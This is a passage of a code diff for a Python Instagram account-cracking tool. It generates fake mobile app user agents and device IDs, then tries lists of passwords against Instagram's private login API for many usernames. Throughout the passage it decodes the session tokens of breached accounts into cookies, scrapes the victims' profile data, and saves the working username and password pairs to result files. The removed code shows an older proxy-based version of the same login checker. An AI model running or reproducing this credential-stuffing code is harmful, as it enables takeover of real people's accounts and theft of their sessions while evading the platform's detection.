.0.29.119,134.0.0.26.121,131.0.0.25.116,134.0.0.26.121,134.0.0.26.121,84.0.0.21.105,127.0.0.30.121,134.0.0.26.121,124.0.0.17.473,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,80.0.0.14.110,133.0.0.32.120,134.0.0.26.121,123.0.0.21.114,134.0.0.26.121,102.0.0.20.117,131.0.0.23.116,131.0.0.25.116,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,102.0.0.20.117,80.0.0.14.110,87.0.0.18.99,134.0.0.26.121,93.1.0.19.102,134.0.0.26.121,134.0.0.26.121,129.0.0.29.119,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,122.0.0.29.238,134.0.0.26.121,134.0.0.26.121,124.0.0.17.473,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,96.0.0.28.114,129.0.0.29.119,131.0.0.25.116,131.0.0.23.116,135.0.0.15.119,124.0.0.17.473,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,131.0.0.25.116,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,129.0.0.29.119,134.0.0.26.121,134.0.0.26.121,131.0.0.25.116,131.0.0.23.116,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121,123.0.0.21.114,134.0.0.26.121,130.0.0.31.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,133.0.0.32.120,134.0.0.26.121,133.0.0.32.120,131.0.0.23.116,104.0.0.21.118,122.0.0.29.238,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,134.0.0.26.121,127.0.0.30.121,134.0.0.26.121,134.0.0.26.121,123.0.0.21.114,133.0.0.32.120,123.0.0.21.114,134.0.0.26.121,134.0.0.26.121,131.0.0.23.116,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,84.0.0.21.105,131.0.0.23.116,133.0.0.32.120,128.0.0.26.128,134.0.0.26.121,134.0.0.26.121,134.0.0.26.121,133.0.0.32.120,134.0.0.26.121,134.0.0.26.121")
+	igve=igv.split(",")
+	versi=random.choice(igve)
+	realme = random.choice(["RMX3997","RMX3765","RMX3820","RMX3765","RMX3999","RMX3997","RMX3997","RMX3999","RMX3820","RMX3999","RMX3765","RMX3997","RMX3765","RMX3999","RMX3765","RMX3910","RMX3997","RMX3765","RMX3998","RMX3765","RMX3765","RMX3910","RMX3765","RMX3765","RMX3765","RMX3765","RMX3765","RMX3999","RMX3999","RMX3910","RMX3765","RMX3999","RMX3765","RMX3997","RMX3910","RMX3765","RMX3999","RMX3999","RMX3997","RMX3765","RMX3998","RMX3997","RMX3765","RMX3820","RMX3998","RMX3765","RMX3999","RMX3998","RMX3998","RMX3765","RMX3765","RMX3765","RMX3999","RMX3910","RMX3161","RMX3997","RMX3997","RMX3765","RMX3765","RMX3765","RMX3998","RMX3765","RMX3999","RMX3765","RMX3997","RMX3765","RMX3997","RMX3820","RMX3765","RMX3997","RMX3999","RMX3765","RMX3997","RMX3765","RMX3999","RMX3999","RMX3997","RMX3820","RMX3997","RMX3997","RMX3999","RMX3997","RMX3765","RMX3910","RMX3820","RMX3997","RMX3765","RMX3999","RMX3999","RMX3999","RMX3765","RMX3997","RMX3998","RMX3820","RMX3999","RMX3910","RMX3765","RMX3997","RMX3765","RMX3999","RMX3997","RMX3765","RMX3997","RMX3820","RMX3999","RMX3997"])
+	ara1 = ('Barcelona 289.0.0.77.109 Android ({}; {}; Realme; {}; marlin; qcom; in_ID; 489720145)'.format(Android_Version(android_version), android_version, dpi_pixel, realme))
+	samsung = random.choice(["SM-A115F","Samsung A4","Samsung A4","samsung a1","SM-A145R","samsung a1","SM-G973F","SM-A346B","SM-G973F","SM-S9280","SM-E156B","SM-E146B","samsung a1","SM-A346B","Samsung A4","SM-E546B","SM-A346B","SM-A145R","SM-A336B","GT-S5660","Samsung A4","samsung a1","SM-E156B","SM-A115F","SM-S9160","SM-A336B","Samsung A4","samsung a1","SM-A346B","samsung a1","SM-A115F","SM-A115F","Samsung A4","SM-A145R","SM-A136B","SM-S9280","SM-A115F","SM-S9280","SM-E546B","SM-A336B","SM-A136B","Samsung A4","SM-A115F","SM-A145R","samsung a1","SM-A336B","SM-A136B","SM-A336B","SM-G973F","SM-A336B","GT-S5660","Samsung A4","GT-S5660","Samsung A4","SM-A015M","Samsung A4","SM-A115F","SM-E546B","SM-E156B","SM-A015M","SM-A136B","SM-A336B","SM-E546B","SM-A145R","SM-A136B","SM-A015M","SM-A115F","Samsung A4","GT-S5660","SM-S9160","Samsung A4","SM-E146B","SM-A136B","SM-E546B","SM-G973F","Samsung A4","SM-A336B","SM-G973F","SM-A015M","SM-S9280","SM-A115F","Samsung A4","Samsung A4","SM-A115F","Samsung A4","samsung a1","GT-S5660","SM-A346B"])
+	ara2 = ('Barcelona 289.0.0.77.109 Android ({}; {}; samsung; {}; marlin; qcom; in_ID; 489720145)'.format(Android_Version(android_version), android_version, dpi_pixel, samsung))
+	infinix = random.choice(["23046RP50C","22127RK46C","23054RA19C","MiTV-AESP0","22041216UC","22041216UC","2312CRNCCL","22041216UC","MiTV-AESP0","22041216UC","24040RN64Y","22041216UC","23046PNC9C","2312CRNCCL","23046RP50C","2312CRNCCL","23113RKC6C","22101320C","22041216UC","22041216UC","24040RN64Y","23046RP50C","22101320C","21091116AC","MiTV-AESP0","22101320C","2312CRNCCL","23046RP50C","2312CRNCCL","2312CRNCCL","23046RP50C","23013RK75C","22101320C","22122RK93C","2312CRNCCL","23013RK75C","23113RKC6C","22041216UC","2312CRNCCL","23046PNC9C","24030PN60G","22101320C","22041216UC","2312CRNCCL","23013RK75C","22041216UC","23113RKC6C","22101320C","24040RN64Y","2312CRNCCL","24040RN64Y","23046RP50C","22101320C","2312CRNCCL","23046PNC9C","22041216UC","2312CRNCCL","22122RK93C","22041216UC","23013RK75C","2312CRNCCL","22041216UC","2312CRNCCL","22122RK93C","22101320C","22041216UC","24040RN64Y","MiTV-AESP0","MiTV-AESP0","MiTV-AESP0","22041216UC","22101320C","22101320C","2404ARN45A","23046RP50C","23046PNC9C","21091116AC","21091116AC","22127RK46C","21091116AC","22101320C","23113RKC6C","24030PN60G","22101320C","23046RP50C","23113RKC6C","23046RP50C","22101320C","22127RK46C","23113RKC6C","2312CRNCCL","21091116AC","23046PNC9C","22041216UC","23046RP50C","MiTV-AESP0","24040RN64Y","21091116AC","23113RKC6C","2312CRNCCL","24040RN64Y","24040RN64Y","22122RK93C","23113RKC6C","22101320C","2312CRNCCL","MiTV-AESP0","23113RKC6C","MiTV-AESP0","24040RN64Y","22041216UC"])
+	ara5 = ('Barcelona 289.0.0.77.109 Android ({}; {}; Xiaomi; {}; marlin; qcom; in_ID)'.format(Android_Version(android_version), android_version, dpi_pixel, infinix))
+	motorola = random.choice(['MOT-A6020l37', 'MotoA953', 'XT603', 'XT682', 'MB865', 'MB865', 'MB860', 'MB860', 'MB860', 'MB860', 'MB860', 'MB860', 'Motorola Defy', 'XT320', 'MOT-XT320', 'XT557', 'XT556', 'XT555C', 'Droid', 'Momodesign MD Droid', 'Droid', 'DROID2', 'DROID2 GLOBAL', 'DROID2 GLOBAL', 'DROID2 GLOBAL', 'DROID3', 'XT894', 'DROID4', 'DROID4', 'DROID4 4G', 'Droid4X-WIN', 'Droid4X-WIN', 'DROID BIONIC', 'DROID BIONIC', 'DROID BIONIC 4G', 'DroidBox', 'XT1565', 'XT1030', 'XT1030', 'DroidPC Dual Core', 'DROID Pro', 'XT610', 'XT910', 'DROID RAZR', 'MOT-XT910S', 'XT910', 'DROID RAZR', 'XT910', 'MOT-XT910', 'DROID RAZR HD', 'XT910', 'DROID RAZR 4G', 'XT918', 'XT916', 'XT914', 'XT915', 'XT916', 'XT920', 'XT919', 'XT919', 'XT920', 'DROID RAZR HD', 'XT925', 'DROID RAZR HD', 'XT926', 'XT890', 'XT890', 'XT890', 'XT890', 'XT907', 'XT907', 'XT905', 'XT907', 'XT907', 'XT912', 'XT886', 'XT885', 'DROID RJ', 'XT1254', 'XT1254', 'XT1585', 'XT1080', 'XT1080', 'XT1080', 'Droid V3.0', 'DROIDX', 'DROIDX', 'DROIDX', 'DROIDX', 'DROIDX', 'DROID X2', 'DROID X2', 'Motorola E7 POWER', 'motorola edge', 'Motorola Edge S', 'motorola edge (2021)', 'motorola edge (2022', 'motorola edge (2022)', 'motorola edge 20', 'XT2153-1', 'motorola edge 20 pro', 'motorola edge 20 pro', 'motorola edge 30', 'motorola edge 30 neo', 'motorola edge 30 pro', 'motorola edge 40', 'motorola edge 40 pro', 'motorola edge plus', 'motorola edge plus', 'XT2125-4', 'xt2125-4', 'XT2175-2', 'XT2175-2', 'XT2201-2', 'XT2201-2', 'XT2201-2', 'XT881', 'XT901'])
+	ara6 = ('Barcelona 289.0.0.77.109 Android ({}; {}; motorola; {}; marlin; qcom; in_ID; 489720145)'.format(Android_Version(android_version), android_version, dpi_pixel, motorola))
+	user_agent = random.choice([ara1, ara2, ara5, ara6])
+	return user_agent
 
+def UserAgentApp():
+	code = random.choice(['370911961','370911964','370911965','370911966','370911967','370911968','370911971','370911972','370911973','370911974','370911975','370911976','370911977','371025731'])
+	app_version = random.randint(100, 342)
+	android_version = random.randint(25, 31)
+	app_patch_version = random.randint(14, 46)
+	build_number = random.randint(85, 125)
+	bahasa = random.choice(['en_US', 'id_ID'])
+	realme = f'Instagram {app_version}.0.0.{app_patch_version}.{build_number} Android ({android_version}/14; 480dpi; 1080x2290; realme; RMX3782; RE5C6CL1; mt6835; {bahasa}; {code})'
+	huawai = f'Instagram {app_version}.0.0.{app_patch_version}.{build_number} Android ({android_version}/10; 480dpi; 1080x2282; HUAWEI; FRL-L22; HWFRL-M; mt6768; {bahasa}; {code})'
+	samsung = f'Instagram {app_version}.0.0.{app_patch_version}.{build_number} Android ({android_version}/14; 480dpi; 1080x2290; samsung; SM-A225F; A225FXXU3BVF1; mt6768; {bahasa}; {code})'
+	xiaomi = f'Instagram {app_version}.0.0.{app_patch_version}.{build_number} Android ({android_version}/14; 480dpi; 1080x2290; Xiaomi; Redmi 9A; M2006C3LG; mt6768; {bahasa}; {code})'
+	vivo = f'Instagram {app_version}.0.0.{app_patch_version}.{build_number} Android ({android_version}/14; 480dpi; 1080x2290; vivo; vivo 2007; PD1969F_EX; mt6768; {bahasa}; {code})'
+	oppo = f'Instagram {app_version}.0.0.{app_patch_version}.{build_number} Android ({android_version}/14; 480dpi; 1080x2290; OPPO; CPH2083; CPH2083_11_A.53; mt6768; {bahasa}; {code})'
+	iphone = f'Instagram {app_version}.0.0.{app_patch_version}.{build_number} iOS ({android_version}/14; 2; iPhone; iPhone 12; iPhone12,1; {bahasa}; {code})'
+	iphone_x = f'Instagram {app_version}.0.0.{app_patch_version}.{build_number} iOS ({android_version}/14; 2; iPhone; iPhone X; iPhone10,3; {bahasa}; {code})'
+	google_pixel = f'Instagram {app_version}.0.0.{app_patch_version}.{build_number} Android ({android_version}/14; 480dpi; 1080x2400; Google; Pixel 5; GD1Y; mt6768; {bahasa}; {code})'
+	infinix = f'Instagram {app_version}.0.0.{app_patch_version}.{build_number} Android ({android_version}/14; 480dpi; 1080x2400; Infinix; Infinix Note 10; X6812; mt6768; {bahasa}; {code})'
+	pragmatyc = f'Instagram {app_version}.0.0.{app_patch_version}.{build_number} Android ({android_version}/14; 480dpi; 1080x2400; Pragmatyc; Pragmatyc Device; PGT-1; mt6768; {bahasa}; {code})'
+	return random.choice([realme, huawai, samsung, xiaomi, vivo, oppo, iphone, iphone_x, google_pixel, infinix, pragmatyc])
 
-def Crack_x(username, memek):
+def Crack_api(username, memek):
 	global Ok, Cp, Loop
-	sys.stdout.write(f"\r{Colors.BOLD}[Instagram App]{Colors.ENDC} {Colors.OKCYAN}[Proses: {Loop}/{len(Uuid)}/{Colors.OKCYAN}{str(username)[:6]}]{Colors.ENDC} Success: {Colors.OKGREEN}{Ok}{Colors.ENDC} Checkpoint: {Colors.WARNING}{Cp}{Colors.ENDC}"),
+	bo = random.choice([u])
+	print(f" {b}[{P}●{b}]{P} Runing {u}{Loop} {P}Collected {u}{str(len(Uuid))} {P}Success {b}{Ok} {P}Failed {k}{Cp}", end="\r")
 	sys.stdout.flush()
 	for password in memek:
 		try:
 			ses = requests.Session()
-			uag = aguss()
+			uag = UserAgentApp()
 			device_id, family_device_id = str(uuid.uuid4()), str(uuid.uuid4())
 			_hash = hashlib.md5()
 			_hash.update(username.encode('utf-8') + password.encode('utf-8'))
 			hex_ = _hash.hexdigest()
 			_hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))
-			ses.headers.update({'x-fb-http-engine': 'Liger','Host': 'i.instagram.com','x-bloks-version-id': '5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73','x-ig-capabilities': '3brTv10=','x-ig-device-id': device_id,'x-tigon-is-retry': 'True, True','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','x-ig-connection-type': 'MOBILE(LTE)','connection': 'keep-alive','x-ig-bandwidth-totaltime-ms': str(random.randint(2000, 9000)),'x-ig-www-claim': '0','x-ig-bandwidth-totalbytes-b': str(random.randint(5000000, 90000000)),'x-ig-mapped-locale': 'id_ID','x-pigeon-rawclienttime': '{:.6f}'.format(time.time()),'x-ig-app-locale': 'in_ID','x-ig-bandwidth-speed-kbps': str(random.randint(2500000, 3000000) / 1000),'user-agent': uag,'x-ig-family-device-id': family_device_id,'x-bloks-is-layout-rtl': 'False','x-fb-connection-type': 'MOBILE.LTE','x-fb-server-cluster': 'True','accept-language': 'id-ID, en-US','ig-intended-user-id': '0','x-ig-app-id': '3419628305025917','x-ig-android-id': f'android-{_hash.hexdigest()[:16]}','priority': 'u=3','x-ig-timezone-offset': str(-time.timezone),'x-ig-device-locale': 'in_ID','x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0','x-fb-client-ip': 'True'})
-			data = (f'params=%7B%22client_input_params%22%3A%7B%22device_id%22%3A%22android-{_hash.hexdigest()[:16]}%22%2C%22login_attempt_count%22%3A1%2C%22secure_family_device_id%22%3A%22%22%2C%22machine_id%22%3A%22%22%2C%22accounts_list%22%3A%5B%5D%2C%22auth_secure_device_id%22%3A%22%22%2C%22password%22%3A%22%23PWD_INSTAGRAM%3A0%3A{str(int(datetime.datetime.now().timestamp()))}%3A{urllib.request.quote(str(password))}%22%2C%22family_device_id%22%3A%22{family_device_id}%22%2C%22fb_ig_device_id%22%3A%5B%5D%2C%22device_emails%22%3A%5B%5D%2C%22try_num%22%3A3%2C%22event_flow%22%3A%22login_manual%22%2C%22event_step%22%3A%22home_page%22%2C%22openid_tokens%22%3A%7B%7D%2C%22client_known_key_hash%22%3A%22%22%2C%22contact_point%22%3A%22{urllib.request.quote(str(username))}%22%2C%22encrypted_msisdn%22%3A%22%22%7D%2C%22server_params%22%3A%7B%22username_text_input_id%22%3A%22p5hbnc%3A46%22%2C%22device_id%22%3A%22android-{_hash.hexdigest()[:16]}%22%2C%22should_trigger_override_login_success_action%22%3A0%2C%22server_login_source%22%3A%22login%22%2C%22waterfall_id%22%3A%22{urllib.request.quote(str(uuid.uuid4()))}%22%2C%22login_source%22%3A%22Login%22%2C%22INTERNAL__latency_qpl_instance_id%22%3A152086072800150%2C%22reg_flow_source%22%3A%22login_home_native_integration_point%22%2C%22is_platform_login%22%3A0%2C%22is_caa_perf_enabled%22%3A0%2C%22credential_type%22%3A%22password%22%2C%22family_device_id%22%3A%22{family_device_id}%22%2C%22INTERNAL__latency_qpl_marker_id%22%3A36707139%2C%22offline_experiment_group%22%3A%22caa_iteration_v3_perf_ig_4%22%2C%22INTERNAL_INFRA_THEME%22%3A%22harm_f%22%2C%22password_text_input_id%22%3A%22p5hbnc%3A47%22%2C%22ar_event_source%22%3A%22login_home_page%22%7D%7D&\bk_client_context=%7B%22bloks_version%22%3A%225f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73%22%2C%22styles_id%22%3A%22instagram%22%7D&bloks_versioning_id=5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73')
-			response = ses.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/',data=data, allow_redirects = True)
+			ses.headers.update({
+				'x-fb-http-engine': 'Liger',
+				'Host': 'i.instagram.com',
+				'x-bloks-version-id': '5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73',
+				'x-ig-capabilities': '3brTv10=',
+				'x-ig-device-id': device_id,
+				'x-tigon-is-retry': 'True, True',
+				'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+				'x-ig-connection-type': 'MOBILE(LTE)',
+				'connection': 'keep-alive',
+				'x-ig-bandwidth-totaltime-ms': str(random.randint(2000, 9000)),
+				'x-ig-www-claim': '0',
+				'x-ig-bandwidth-totalbytes-b': str(random.randint(5000000, 90000000)),
+				'x-ig-mapped-locale': 'id_ID',
+				'x-pigeon-rawclienttime': '{:.6f}'.format(time.time()),
+				'x-ig-app-locale': 'in_ID',
+				'x-ig-bandwidth-speed-kbps': str(random.randint(2500000, 3000000) / 1000),
+				'user-agent': uag,
+				'x-ig-family-device-id': family_device_id,
+				'x-bloks-is-layout-rtl': 'False',
+				'x-fb-connection-type': 'MOBILE.LTE',
+				'x-fb-server-cluster': 'True',
+				'accept-language': 'id-ID, en-US',
+				'ig-intended-user-id': '0',
+				'x-ig-app-id': '3419628305025917',
+				'x-ig-android-id': f'android-{_hash.hexdigest()[:16]}',
+				'priority': 'u=3',
+				'x-ig-timezone-offset': str(-time.timezone),
+				'x-ig-device-locale': 'in_ID',
+				'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0',
+				'x-fb-client-ip': 'True'
+			})
+			data = (f'params=%7B%22client_input_params%22%3A%7B%22device_id%22%3A%22android-{_hash.hexdigest()[:16]}%22%2C%22login_attempt_count%22%3A1%2C%22secure_family_device_id%22%3A%22%22%2C%22machine_id%22%3A%22%22%2C%22accounts_list%22%3A%5B%5D%2C%22auth_secure_device_id%22%3A%22%22%2C%22password%22%3A%22%23PWD_INSTAGRAM%3A0%3A{str(int(datetime.datetime.now().timestamp()))}%3A{urllib.request.quote(str(password))}%22%2C%22family_device_id%22%3A%22{family_device_id}%22%2C%22fb_ig_device_id%22%3A%5B%5D%2C%22device_emails%22%3A%5B%5D%2C%22try_num%22%3A3%2C %22event_flow%22%3A%22login_manual%22%2C%22event_step%22%3A%22home_page%22%2C%22openid_tokens%22%3A%7B%7D%2C%22client_known_key_hash%22%3A%22%22%2C%22contact_point%22%3A%22{urllib.request.quote(str(username))}%22%2C%22encrypted_msisdn%22%3A%22%22%7D%2C%22server_params%22%3A%7B%22username_text_input_id%22%3A%22p5hbnc%3A46%22%2C%22device_id%22%3A%22android-{_hash.hexdigest()[:16]}%22%2C%22should_trigger_override_login_success_action%22%3A0%2C%22server_login_source%22%3A%22login%22%2C%22waterfall_id%22%3A%22{urllib.request.quote(str(uuid.uuid4()))}%22%2C%22login_source%22%3A%22Login%22%2C%22INTERNAL__latency_qpl_instance_id%22%3A152086072800150%2C%22reg_flow_source%22%3A%22login_home_native_integration_point%22%2C%22is_platform_login%22%3A0%2C%22is_caa_perf_enabled%22%3A0%2C%22credential_type%22%3A%22password%22%2C%22family_device_id%22%3A%22{family_device_id}%22%2C%22INTERNAL__latency_qpl_marker_id%22%3A36707139%2C%22offline_experiment_group%22%3A%22caa_iteration_v3_perf_ig_4%22%2C%22INTERNAL_INFRA_THEME%22%3A%22harm_f%22%2C%22password_text_input_id%22%3A%22p5hbnc%3A47%22%2C%22ar_event_source%22%3A%22login_home_page%22%7D%7D&bk_client_context=%7B%22bloks_version%22%3A%225f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73%22%2C%22styles_id%22%3A%22instagram%22%7D&bloks_versioning_id=5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73')
+			response = ses.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data=data, allow_redirects=True)
 			if 'Bearer IGT:2:' in str(response.text.replace('\\', '')) and '"pk_id":' in str(response.text.replace('\\', '')):
 				try:
 					ig_set_authorization = re.search('"IG-Set-Authorization": "(.*?)"', str(response.text.replace('\\', ''))).group(1)
 					try:
 						decode_ig_set_authorization = json.loads(base64.urlsafe_b64decode(ig_set_authorization.split('Bearer IGT:2:')[1]))
-						cookies = (";".join([str(x)+"="+str(y) for x,y in decode_ig_set_authorization.items()]))
+						cookies = (";".join([str(x) + "=" + str(y) for x, y in decode_ig_set_authorization.items()]))
 					except Exception as e:
 						cookies = ('-')
 				except Exception as e:
 					ig_set_authorization = (None)
-				Ok+=1
-				post, peng, meng, fullname = data_target(username)
-				print(f"                                                               ", end='\r')
+				Ok += 1
+				post, peng, meng, mail, fullname, fbid, phone = data_target(username)
+				print(f"                                                                ", end='\r')
 				time.sleep(0.10)
-				print(f"\r{P}account: {fullname[:10]}\nUsername: {username}\nPassword: {password}\nPengikut: {peng}\nMengikuti: {meng}\nPostingan: {post}\nCookies: {cookies}")
-				open(f"result/success-{day}.txt","a").write(f'{username}|{password}|{peng}|{meng}\n')
+				print(f" {b}[{P}●{b}]{P} Target Data Information")
+				print(f"     {b}＼{P} Fullnames :{b} {fullname} ")
+				print(f"     {b}＼{P} Usernames :{b} {username} ")
+				print(f"     {b}＼{P} Passwords :{b} {password} ")
+				print(f"     {b}＼{P} Followers :{b} {peng} ")
+				print(f"     {b}＼{P} Following :{b} {meng} ")
+				print(f"     {b}＼{P} Mycookies :{b} {ig_set_authorization}{cookies} \n")
+				open('RESULTS-INSTAGRAM/'+Okc, 'a').write(f"{username}|{password}|{peng}")
 				break
 			elif 'challenge_required' in str(response.text.replace('\\', '')) or 'https://i.instagram.com/challenge/' in str(response.text.replace('\\', '')):
-				Cp+=1
-				post, peng, meng, fullname = data_target(username)
-				print(f"                                                               ", end='\r')
+				Cp += 1
+				post, peng, meng, mail, fullname, fbid, phone = data_target(username)
+				print(f"                                                                ", end='\r')
 				time.sleep(0.10)
-				print(f"\r{K}account: {fullname[:10]}\nUsername: {username}\nPassword: {password}\nPengikut: {peng}\nMengikuti: {meng}\nPostingan: {post}")
-				open(f"result/checkpoint-{day}.txt","a").write(f'{username}|{password}|{peng}|{meng}\n')
+				print(f" {k}[{P}●{k}]{P} Target Data Information")
+				print(f"     {k}＼{P} Fullnames :{k} {fullname} ")
+				print(f"     {k}＼{P} Usernames :{k} {username} ")
+				print(f"     {k}＼{P} Passwords :{k} {password} ")
+				print(f"     {k}＼{P} Followers :{k} {peng} ")
+				print(f"     {k}＼{P} Following :{k} {meng} ")
+				print(f"     {k}＼{P} Useragent :{k} {uag}\n ")
+				open('RESULTS-INSTAGRAM/'+Cpc, 'a').write(f"{username}|{password}|{peng}")
 				break
-			elif 'ip_block' in str(response.text.replace('\\', '')):
-				print(f"\rstatus ip: {M}spam{P} threads {K}{Loop}{P}/{H}{str(len(Uuid))}{P}/{H}{str(username)[:6]}{P}/Ok:-{H}{Ok}{P}/Cp:-{K}{Cp}{P}", end='')
-			elif 'Please wait a few' in str(response.text.replace('\\', '')) or 'Harap tunggu beberapa' in str(response.text.replace('\\', '')):
-				print(f"                                                               ", end='\r')
-				time.sleep(0.10)
-				print(f"Harap tunggu beberapa menit", end='\r')
-				time.sleep(0.10)
-			elif 'Unmapped IG Error' in str(response.text.replace('\\', '')) or 'This IG Error was not mapped to an Error Code.' in str(response.text.replace('\\', '')):
-				sys.stdout.write(f"\rstatus ip: {M}spam{P} threads {K}{Loop}{P}/{H}{str(len(Uuid))}{P}/{H}{str(username)[:6]}{P}/Ok:-{H}{Ok}{P}/Cp:-{K}{Cp}{P}"),
-				sys.stdout.flush()
 			else:
 				continue
-		#except Exception as e:print(e)
-		except requests.exceptions.ConnectionError:time.sleep(20)
-	Loop+=1
-        
-def checkAPI(usr,pwd):
-    try:
-        ts = calendar.timegm(current_GMT)
-        s = requests.Session()
-        proxy = {'http': 'socks5://'+random.choice(proxxy)}
-        token=s.get("https://z-p42.www.instagram.com/accounts/login",headers={"user-agent":InstaIgeh()}).content
-        crf_token=re.findall(r"\"csrf_token\"\:\"(.*?)\"", str(token))[0]
-        s.headers.update({
-            'authority': 'www.instagram.com',
-            'connection': 'keep-alive',
-            'sec-ch-ua': '";Not A Brand";v="99", "Chromium";v="94"',
-            'x-ig-app-id': '1217981644879628',
-            'x-ig-www-claim': 'hmac.AR3jlStdcYspw88nLWvVnCDdiZ-KPvru_TasoSJlzGz-iXV2',
-                'x-requested-with': 'XMLHttpRequest',
-            'sec-ch-ua-mobile': '?1',
-            'x-instagram-ajax': 'c6412f1b1b7b',
-            'content-type': 'application/x-www-form-urlencoded',
-            'accept': '*/*',
-            'x-csrftoken': crf_token,
-            'user-agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4A Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Mobile Safari/537.36',
-            'x-asbd-id': '198387',
-            'sec-ch-ua-platform': '"Android"',
-            'origin': 'https://www.instagram.com',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-dest': 'empty',
-            'referer': 'https://www.instagram.com/',
-            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'
-        })
+		except requests.exceptions.ConnectionError:
+			time.sleep(20)
+	Loop += 1
 
-        param={
-            "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{pwd}",
-                "username": usr,
-                "optIntoOneTap": False,
-                "queryParams": "{}",
-                "stopDeletionNonce": "",
-                "trustedDeviceRecords": "{}"
-        }
-        x = s.post("https://z-p42.www.instagram.com/accounts/login/ajax/",data=param,proxies=proxy)
-        x_jason=json.loads(x.text)
-        if "userId" in x_jason:
-            x = s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(usr),headers={"user-agent":InstaIgeh(),"x-ig-app-id":'936619743392459'})
-            x_jason = x.json()["data"]["user"]
-            nama = x_jason["full_name"]
-            pengikut = x_jason["edge_followed_by"]["count"]
-            mengikut = x_jason["edge_follow"]["count"]
-            postingan = x_jason["edge_owner_to_timeline_media"]["count"]
-            tree = Tree(Panel.fit(f"{H2}{usr} {P2}| {H2}{pwd}")).add(Panel.fit(f"Username : {nama}"))
-            tree.add(Panel.fit(f"{P2}Followers : {H2}{pengikut}")).add(Panel.fit(f"{P2}Following : {H2}{mengikut}"))
-            tree.add(Panel.fit(f"{P2}Postingan : {H2}{postingan}"))
-            prints(tree)
-        elif 'checkpoint_url' in x.text:
-            nama = x_jason["full_name"]
-            pengikut = x_jason["edge_followed_by"]["count"]
-            mengikut = x_jason["edge_follow"]["count"]
-            postingan = x_jason["edge_owner_to_timeline_media"]["count"]
-            tree = Tree("")
-            tree.add(Panel.fit(f"{K2}{usr} {P2}| {K2}{pwd}"))
-            tree.add(f"{P2}Username : {K2}{nama}")
-            tree.add(f"{P2}Followers : {K2}{pengikut}")
-            tree.add(f"{P2}Following : {K2}{mengikut}")
-            tree.add(f"{P2}Postingan : {K2}{postingan}")
-            prints(tree)
-        elif 'Please wait a few minutes' in str(x.text):
-            sys.stdout.write(f"\r {U}Please wait a few minutes second");sys.stdout.flush();sleep(10)
-            checkAPI(usr,pwd)
-    except:
-        checkAPI(usr,pwd)
-if __name__ == "__main__":
-    LoginCuyy()
+def Crack_i(username, memek):
+	global Ok, Cp, Loop
+	bo = random.choice([u])
+	print(f" {b}[{P}●{b}]{P} Runing {u}{Loop} {P}Collected {u}{str(len(Uuid))} {P}Success {b}{Ok} {P}Failed {k}{Cp}", end="\r")
+	sys.stdout.flush()
+	for password in memek:
+		try:
+			ua = UserAgentApp()
+			ses = requests.Session()
+			device_id, family_device_id = str(uuid.uuid4()), str(uuid.uuid4())
+			_hash = hashlib.md5()
+			_hash.update(username.encode('utf-8') + password.encode('utf-8'))
+			hex_ = _hash.hexdigest()
+			_hash.update(hex_.encode('utf-8') + '12345'.encode('utf-8'))
+			ses.headers.update({'authority': 'i.instagram.com','x-bloks-version-id': '8dab28e76d3286a104a7f1c9e0c632386603a488cf584c9b49161c2f5182fe07','x-bloks-is-layout-rtl': 'false','x-ig-capabilities': '3brTv10=','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','x-ig-connection-type': 'MOBILE(LTE)','x-ig-bandwidth-totaltime-ms': '0','x-ig-www-claim': '0','x-ig-bandwidth-totalbytes-b': '0','x-ig-mapped-locale': 'id_ID','x-pigeon-rawclienttime': '{:.6f}'.format(time.time()),'x-ig-app-locale': 'in_ID','x-ig-bandwidth-speed-kbps': '-1.000','user-agent': ua,'x-ig-family-device-id': family_device_id,'x-fb-connection-type': 'MOBILE.LTE','x-ig-device-id': device_id,'x-fb-server-cluster': 'True','x-fb-http-engine': 'Liger','ig-intended-user-id': '0','x-ig-app-id': '567067343352427','x-ig-android-id': f'android-{_hash.hexdigest()[:16]}','x-ig-timezone-offset': str(-time.timezone),'priority': 'u=3','x-ig-device-locale': 'in_ID','x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-0','x-fb-client-ip': 'True',})
